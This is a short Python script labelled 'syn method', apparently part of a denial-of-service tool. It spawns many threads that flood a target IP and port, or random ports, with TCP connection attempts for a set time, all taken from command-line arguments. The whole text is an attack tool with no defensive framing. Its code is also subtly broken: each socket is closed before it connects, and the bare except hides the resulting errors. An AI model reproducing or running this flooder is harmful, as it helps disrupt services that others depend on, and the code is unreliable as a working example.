

# syn method

import socket, time, random, threading
from sys import argv
from threading import Thread

def syn(ip, port, floodtime):
	while time.time() < floodtime:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			sock.setblocking(0)
		try:
			dport = random.randint(1, 65535) if port == 0 else port
			sock.connect((ip, dport))
		except:
			pass

for _ in range(int(argv[4])):
        Thread(target=syn, args=(str(argv[1]), int(argv[2]), time.time() + int(argv[3]))).start()
